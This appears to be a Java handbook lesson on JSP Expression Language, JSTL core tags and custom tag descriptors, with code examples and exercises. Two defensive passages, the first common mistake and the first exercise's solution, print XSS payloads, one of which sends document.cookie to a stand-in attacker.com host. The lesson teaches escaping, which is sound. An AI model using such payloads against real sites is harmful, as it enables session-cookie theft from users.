---
id: topic-75
slug: expression-language-el-and-jstl
topicNumber: 75
title: JSTL Core Tags & Expression Language (EL)
part: 'Part 2: Java EE & Jakarta EE'
sectionNumber: 21
sectionTitle: JavaServer Pages (JSP) & Templating
versionBadge: Jakarta EL 5.0 / JSTL 3.0
difficulty: Intermediate
readingTime: 15 min read
shortDescription: >-
  Build scriptlet-free JSP views: master Expression Language (${...}) property
  navigation, null-safety, JSTL core tags (<c:forEach>, <c:if>, <c:out>), and
  Custom Tag Library Descriptors (.tld).
prerequisites:
  - 'Topic 74: JSP Architecture, Syntax & Implicit Objects'
  - 'Topic 19: Encapsulation & Data Integrity (JavaBeans)'
relevanceLevel: OPTIONAL / LEGACY
---
# JSTL Core Tags & Expression Language (EL)

> 🏛️ **Roadmap Seal:** **`[OPTIONAL / LEGACY]`** — *Historical / legacy enterprise tech. Safely skip unless maintaining legacy enterprise systems.*

### 1. What It Is and Why It Exists
Early versions of JSP were plagued by Java scriptlets (`<% ... %>`). Mixing Java control flow (`for`, `if`, `try/catch`) with HTML produced unreadable, fragile markup that was difficult for frontend web designers to edit and prone to `NullPointerException` crashes.

To modernize server-side web presentation, the Jakarta EE community introduced three complementary technologies:
1. **Jakarta Expression Language (EL) (`${...}`)**: A concise expression syntax designed to access JavaBeans, collections, maps, and scoped attributes with **automatic null-safety** (expressions evaluating to `null` render gracefully as empty strings rather than throwing `NullPointerException`).
2. **Jakarta Standard Tag Library (JSTL Core `<c:...>`)**: Standard XML-style tags that replace raw Java loops (`<c:forEach>`), conditional branches (`<c:if>`, `<c:choose>`), variable declarations (`<c:set>`), and XSS-safe output (`<c:out>`).
3. **Custom Tag Libraries & Tag Library Descriptors (`.tld`)**: An extensibility mechanism allowing developers to build domain-specific XML tags (e.g., currency formatting, security authorization checks) by extending `SimpleTagSupport` without polluting views with procedural Java code.

Together, EL, JSTL, and Custom Tags allow engineering dynamic enterprise web templates with **zero raw Java scriptlets**.

**Real-World Analogy:**
Imagine reading a magazine template. Instead of an editor printing raw complex database formulas on the page, the template uses clean placeholders like `{{Subscriber.Name}}` and `{{Issue.Date}}`. The printing machine automatically fills in the blanks and gracefully prints nothing if a subscriber has no middle name, rather than stopping the printing press with a fatal error. Custom tags are pre-fabricated modular inserts—like a custom currency widget—stamped into the layout with a single declarative tag.

---

### 2. Prerequisites
- **Topic 74: JSP Architecture, Syntax & Implicit Objects**: Understanding the Jasper lifecycle and attribute scopes.
- **Topic 19: Encapsulation & Data Integrity (JavaBeans)**: Understanding getter naming conventions (`getName()` $\rightarrow$ `${bean.name}`).

---

### 3. Syntax Breakdown

#### 3.1 Expression Language (EL) Fundamentals & Operators
Expression Language evaluates expressions inside `${...}` blocks against scoped variables:

```jsp
<%-- Accessing JavaBean property (Automatically invokes user.getUsername()) --%>
${user.username}

<%-- Accessing Map entries (${map['key'] or ${map.key}) --%>
${sessionScope.cart['itemCount']}

<%-- Accessing List / Array elements by index --%>
${products[0].price}

<%-- Safe Navigation & Empty Check (True if null, empty string, empty map, or empty collection) --%>
${empty cart ? 'Your cart is empty' : 'Items ready for checkout'}

<%-- Ternary Conditional Operator --%>
${user.active ? 'Active Member' : 'Suspended'}

<%-- Arithmetic and Logical Operators --%>
${subtotal * (1 + taxRate)}
${user.role eq 'ADMIN' and user.verified}
```

---

#### 3.2 Key EL Implicit Objects

| EL Implicit Object | Underlying Java Type | Purpose & Scope | Example Expression |
| :--- | :--- | :--- | :--- |
| **`pageScope`** | `Map<String, Object>` | Page-scoped attributes | `${pageScope.tempTitle}` |
| **`requestScope`** | `Map<String, Object>` | Request-scoped attributes (from Controller) | `${requestScope.productList}` |
| **`sessionScope`** | `Map<String, Object>` | User session-scoped attributes | `${sessionScope.currentUser}` |
| **`applicationScope`** | `Map<String, Object>` | ServletContext application-wide attributes | `${applicationScope.appConfig}` |
| **`param`** | `Map<String, String>` | HTTP request query or form parameters | `${param.category}` |
| **`paramValues`** | `Map<String, String[]>` | Multi-value HTTP parameters (checkboxes) | `${paramValues.selectedId[0]}` |
| **`header`** | `Map<String, String>` | Incoming HTTP request headers | `${header['User-Agent']}` |
| **`cookie`** | `Map<String, Cookie>` | Incoming HTTP cookies | `${cookie.theme.value}` |
| **`initParam`** | `Map<String, String>` | Application context initialization parameters | `${initParam.supportEmail}` |

---

#### 3.3 Core JSTL Tag Library Reference Table (`<%@ taglib prefix="c" uri="jakarta.tags.core" %>`)

| Tag | Key Attributes | Operational Description | Enterprise Best Practice |
| :--- | :--- | :--- | :--- |
| **`<c:out>`** | `value`, `default`, `escapeXml` | Evaluates and renders an expression with **automatic HTML entity escaping**. | **Mandatory for untrusted user inputs** to prevent Cross-Site Scripting (XSS). |
| **`<c:set>`** | `var`, `value`, `scope` | Binds a calculated variable into page, request, session, or application scope. | Use to store reusable intermediate calculations in request scope. |
| **`<c:if>`** | `test`, `var`, `scope` | Conditionally evaluates its body if the boolean `test` expression is `true`. | Simple boolean guards (e.g. displaying an alert banner). |
| **`<c:choose>`** | *(Container)* | Parent container implementing mutual exclusivity (`switch / if-else`). | Contains one or more `<c:when>` tags and an optional `<c:otherwise>`. |
| **`<c:when>`** | `test` | Sub-branch of `<c:choose>`. Evaluated in declaration order. | First matching condition renders; subsequent tags are skipped. |
| **`<c:otherwise>`** | *(None)* | Default fallback branch executed when no `<c:when>` matches. | Always provide a fallback for unexpected state values. |
| **`<c:forEach>`** | `items`, `var`, `varStatus`, `begin`, `end`, `step` | Iterates over Collections, Maps, Arrays, or integer numeric ranges. | Inspect `varStatus.first`, `varStatus.last`, `varStatus.count` for UI formatting. |

---

#### 3.4 Custom Tag Library Descriptors (`.tld`) & `SimpleTagSupport` Lifecycle
For domain-specific components, developers author custom tags extending `jakarta.servlet.jsp.tagext.SimpleTagSupport`:

1. **Tag Handler Implementation (`SimpleTagSupport`)**:
   - The container creates an instance of the handler class.
   - Container calls `setJspContext(JspContext)`.
   - Container calls setter methods for each declared tag attribute.
   - Container executes **`doTag()`**, where custom output is written to `getJspContext().getOut()`.

2. **Tag Library Descriptor (`WEB-INF/tld/handbook-tags.tld`)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<taglib xmlns="https://jakarta.ee/xml/ns/jakartaee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="https://jakarta.ee/xml/ns/jakartaee
                            https://jakarta.ee/xml/ns/jakartaee/web-jsptaglibrary_3_0.xsd"
        version="3.0">

    <tlib-version>1.0</tlib-version>
    <short-name>hb</short-name>
    <uri>https://handbook.java/tags</uri>

    <tag>
        <name>formatCurrency</name>
        <tag-class>com.handbook.web.FormatCurrencyTag</tag-class>
        <body-content>empty</body-content>
        <attribute>
            <name>amount</name>
            <required>true</required>
            <rtexprvalue>true</rtexprvalue> <!-- Accepts runtime Expression Language (${...}) -->
            <type>double</type>
        </attribute>
        <attribute>
            <name>currencyCode</name>
            <required>false</required>
            <rtexprvalue>true</rtexprvalue>
        </attribute>
    </tag>
</taglib>
```

---

### 4. Runnable Code Examples

#### Example 1: Jakarta Expression Language Evaluator Demo (Java SE Standalone)
Demonstrates programmatic EL resolution against JavaBeans, Scoped Maps, and empty checks.

```java
package com.handbook.web;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ExpressionLanguageEvaluatorDemo {

    public static Object resolveElProperty(Object target, String property) throws Exception {
        if (target instanceof Map<?, ?> map) {
            return map.get(property);
        }
        String getterName = "get" + Character.toUpperCase(property.charAt(0)) + property.substring(1);
        return target.getClass().getMethod(getterName).invoke(target);
    }

    public static void main(String[] args) throws Exception {
        System.out.println("=== Jakarta Expression Language (EL) Evaluator ===");
        
        UserProfileBean user = new UserProfileBean("jduke", "duke@oracle.com", 1500, true);
        System.out.println("Resolving EL expressions against JavaBean:");
        System.out.println("  ${user.username}      -> " + resolveElProperty(user, "username"));
        System.out.println("  ${user.email}         -> " + resolveElProperty(user, "email"));
        System.out.println("  ${user.loyaltyPoints} -> " + resolveElProperty(user, "loyaltyPoints"));

        Map<String, Object> sessionScope = new HashMap<>();
        sessionScope.put("theme", "VS Code Dark+");
        sessionScope.put("cartItems", List.of("Spring Boot Book", "Java Concurrency In Practice"));

        System.out.println("\nResolving EL expressions against Scoped Maps:");
        System.out.println("  ${sessionScope.theme} -> " + resolveElProperty(sessionScope, "theme"));
        
        List<?> items = (List<?>) resolveElProperty(sessionScope, "cartItems");
        System.out.println("  ${empty sessionScope.cartItems} -> " + (items == null || items.isEmpty()));
        System.out.println("  ${sessionScope.cartItems[0]}    -> " + items.get(0));

        System.out.println("\nExpression Language evaluation completed successfully.");
    }
}
```

**Execution Output:**
```
=== Jakarta Expression Language (EL) Evaluator ===
Resolving EL expressions against JavaBean:
  ${user.username}      -> jduke
  ${user.email}         -> duke@oracle.com
  ${user.loyaltyPoints} -> 1500

Resolving EL expressions against Scoped Maps:
  ${sessionScope.theme} -> VS Code Dark+
  ${empty sessionScope.cartItems} -> false
  ${sessionScope.cartItems[0]}    -> Spring Boot Book

Expression Language evaluation completed successfully.
```

---

#### Example 2: Custom Tag Handler (`FormatCurrencyTag.java`)
```java
package com.handbook.web;

import jakarta.servlet.jsp.JspException;
import jakarta.servlet.jsp.JspWriter;
import jakarta.servlet.jsp.tagext.SimpleTagSupport;
import java.io.IOException;
import java.text.NumberFormat;
import java.util.Locale;

public class FormatCurrencyTag extends SimpleTagSupport {

    private double amount;
    private String currencyCode = "USD";

    public void setAmount(double amount) {
        this.amount = amount;
    }

    public void setCurrencyCode(String currencyCode) {
        this.currencyCode = currencyCode;
    }

    @Override
    public void doTag() throws JspException, IOException {
        JspWriter out = getJspContext().getOut();
        Locale locale = "EUR".equalsIgnoreCase(currencyCode) ? Locale.GERMANY : Locale.US;
        NumberFormat formatter = NumberFormat.getCurrencyInstance(locale);
        out.print(formatter.format(amount));
    }
}
```

---

#### Example 3: Clean Scriptlet-Free Product Catalog View (`catalog.jsp`)
```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<%@ taglib prefix="c" uri="jakarta.tags.core" %>
<%@ taglib prefix="hb" uri="https://handbook.java/tags" %>
<!DOCTYPE html>
<html>
<head><title>Product Catalog - JSTL &amp; EL</title></head>
<body>
    <h1>Product Catalog (Scriptlet-Free)</h1>

    <%-- Safe greeting escaping untrusted user input against XSS --%>
    <p>Welcome, <c:out value="${param.username}" default="Valued Customer" />!</p>

    <c:choose>
        <c:when test="${empty products}">
            <p>No products available in this category.</p>
        </c:when>
        <c:otherwise>
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Name</th>
                        <th>Price</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody>
                    <c:forEach items="${products}" var="prod" varStatus="loop">
                        <tr>
                            <td>${loop.count}</td>
                            <td><c:out value="${prod.name}" /></td>
                            <td><hb:formatCurrency amount="${prod.price}" currencyCode="USD" /></td>
                            <td>
                                <c:if test="${prod.stock > 0}">In Stock (${prod.stock})</c:if>
                                <c:if test="${prod.stock <= 0}"><em>Out of Stock</em></c:if>
                            </td>
                        </tr>
                    </c:forEach>
                </tbody>
            </table>
        </c:otherwise>
    </c:choose>
</body>
</html>
```

**Expected Rendered HTML Output:**
```html
<!DOCTYPE html>
<html>
<head><title>Product Catalog - JSTL &amp; EL</title></head>
<body>
    <h1>Product Catalog (Scriptlet-Free)</h1>
    <p>Welcome, Valued Customer!</p>
    <table>
        <thead>
            <tr><th>#</th><th>Name</th><th>Price</th><th>Status</th></tr>
        </thead>
        <tbody>
            <tr><td>1</td><td>Enterprise Java Cookbook</td><td>$49.99</td><td>In Stock (12)</td></tr>
            <tr><td>2</td><td>Cloud Architecture Guide</td><td>$39.50</td><td>In Stock (5)</td></tr>
        </tbody>
    </table>
</body>
</html>
```

---

### 5. Step-by-Step Execution Trace
1. **Compilation Step**: Jasper recognizes `<%@ taglib prefix="c" %>` and `<%@ taglib prefix="hb" %>`, locating tag definitions in the JSTL JAR and `handbook-tags.tld`.
2. **Tag Handler Resolution**: Jasper compiles custom tags into calls to `FormatCurrencyTag`, instantiating the handler and invoking setter methods for `amount` and `currencyCode`.
3. **EL Expression Evaluation**: The EL resolver inspects `${prod.price}`, automatically invoking `Product.getPrice()` on the current item.
4. **JSTL Loop Dispatch**: `<c:forEach>` executes an internal iterator loop over the `products` collection, pushing `prod` and `loop` into page scope for each iteration.
5. **XSS Neutralization**: `<c:out>` inspects `${param.username}`, transforming characters like `<` and `>` into safe HTML entities (`&lt;` and `&gt;`).

---

### 6. Common Mistakes & Gotchas

#### Mistake 1: Raw `${param.x}` Cross-Site Scripting (XSS) Hazard
*Why it fails*: Writing `<p>Search query: ${param.q}</p>` directly outputs unescaped client input into the HTML DOM. If an attacker submits `?q=<script>alert(document.cookie)</script>`, the browser executes the script.
*The Fix*: Always wrap user-supplied request parameters in `<c:out>`: `<p>Search query: <c:out value="${param.q}" /></p>`.

#### Mistake 2: Missing `<rtexprvalue>true</rtexprvalue>` in `.tld` Attributes
*Why it fails*: In custom tag descriptors, if `<rtexprvalue>` (Runtime Expression Value) is omitted or set to `false`, Jasper rejects runtime EL expressions (`amount="${prod.price}"`) at translation time with a fatal validation error.
*The Fix*: Always configure `<rtexprvalue>true</rtexprvalue>` for attributes that accept dynamic EL evaluations.

#### Mistake 3: Relying on Implicit Scope Precedence without Scope Specifiers
*Why it fails*: When evaluating `${user}`, EL searches Page, Request, Session, and Application scopes in order. If a temporary page-scoped attribute shares the same name as a critical session-scoped security object, the page attribute shadows the session object.
*The Fix*: Explicitly qualify security-sensitive attributes with their scope name: `${sessionScope.user}`.

---

### 7. Best Practices
- **Enforce Scriptlet Ban**: Add `<scripting-invalid>true</scripting-invalid>` in `web.xml` to prevent developers from accidentally introducing `<% ... %>` scriptlets.
- **Always Escape Dynamic Text**: Use `<c:out>` for all dynamic textual output unless the content is trusted, pre-sanitized HTML.
- **Keep Custom Tags Presentation-Only**: Never perform database queries or invoke transactional services inside `doTag()`. Custom tags must strictly format, decorate, or conditionally display data supplied by Controllers.

---

### 8. Version Notes
- **JSTL 1.0 (2002)**: Initial standard tag library release by Sun Microsystems.
- **JSTL 1.2 (Java EE 5)**: Unified Expression Language integrated directly into Java EE platform.
- **JSTL 3.0 (Jakarta EE 10)**: Namespace migrated from `http://java.sun.com/jsp/jstl/core` to `jakarta.tags.core`.

---

### 9. Summary Cheat Sheet: EL & JSTL Reference

| Component | Syntax / Pattern | Operational Behavior |
| :--- | :--- | :--- |
| **JavaBean Getter** | `${user.name}` | Invokes `user.getName()`, handles `null` safely |
| **Map Entry** | `${map['key']}` | Invokes `map.get("key")` |
| **List Element** | `${list[0]}` | Invokes `list.get(0)` |
| **Null / Empty Check**| `${empty var}` | Checks for `null`, `""`, empty collection or map |
| **Conditional Output**| `${cond ? 'A' : 'B'}` | Ternary expression evaluation |
| **XSS-Safe Output** | `<c:out value="..." />` | Escapes `<`, `>`, `&`, `"`, `'` |
| **Iteration** | `<c:forEach items="..." var="...">` | Loops over collections and maps |
| **Multi-Branch** | `<c:choose><c:when>...<c:otherwise>` | Sequential conditional evaluation |

---

### 10. Exercises with Hidden Solutions

#### Exercise 1: Spot the Security Vulnerability (XSS via Query Parameter)
Identify the security vulnerability in the following JSP snippet:
```jsp
<div class="user-greeting">
    <h2>Welcome back, ${param.user}!</h2>
</div>
```
<details>
<summary>View Solution</summary>

```
Vulnerability: Cross-Site Scripting (XSS).
The EL expression ${param.user} outputs raw query parameter text directly into the HTML response without HTML escaping.
An attacker can supply ?user=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>.
Fix: Use <c:out>:
<h2>Welcome back, <c:out value="${param.user}" default="Guest" />!</h2>
```
</details>

#### Exercise 2: Hands-on Implementation (JSTL Table with Alternating Row Styles)
How can `<c:forEach>` be used to render alternating row colors in an HTML table?
<details>
<summary>View Solution</summary>

```jsp
<c:forEach items="${products}" var="prod" varStatus="loop">
    <tr class="${loop.index % 2 == 0 ? 'even-row' : 'odd-row'}">
        <td>${loop.count}</td>
        <td><c:out value="${prod.name}" /></td>
    </tr>
</c:forEach>
```
</details>

#### Exercise 3: Real-World Architecture (Custom Tag vs JSP Include)
When should a development team create a Custom Tag (`SimpleTagSupport`) instead of a reusable `<jsp:include>` fragment?
<details>
<summary>View Solution</summary>

```
1. Use <jsp:include> when reusing static or semi-static page fragments (e.g., standard header, navigation bar, footer) where layout structure is primarily HTML.
2. Use a Custom Tag when:
   - You need programmatic data formatting logic (e.g. currency conversion, localized timestamps, markdown rendering).
   - You need strict type-safe attribute validation enforced by the container.
   - You need reusable logic packaged cleanly into a JAR library for distribution across multiple enterprise WAR applications.
```
</details>

---

### 11. Official Sources
- [Jakarta Standard Tag Library Specification 3.0](https://jakarta.ee/specifications/tags/3.0/) — Jakarta EE
- [Jakarta Expression Language Specification 5.0](https://jakarta.ee/specifications/expression-language/5.0/) — Jakarta EE
